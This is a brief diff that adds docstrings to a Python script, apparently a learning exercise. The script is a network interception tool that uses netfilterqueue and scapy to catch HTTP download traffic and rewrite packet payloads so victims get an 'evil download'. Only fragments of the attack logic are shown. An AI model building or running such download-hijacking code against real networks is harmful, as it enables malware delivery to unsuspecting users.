@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+"""Download replacer that redirects it to a custom link (not working for HTTPS)"""
+
 import netfilterqueue
 import scapy.all as scapy
 import subprocess
@@ -9,6 +11,7 @@ ack_list = []
 
 
 def set_load(s_packet, load):
+    """Modifies the load of the scapy packet passed to the load"""
 
     # New link to the evil download
     s_packet[scapy.Raw].load = load
@@ -20,6 +23,8 @@ def set_load(s_packet, load):
 
 
 def process_packet(packet):
+    """When a packet arrives this function is called"""
+
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
         if scapy_packet[scapy.TCP].dport == 80:
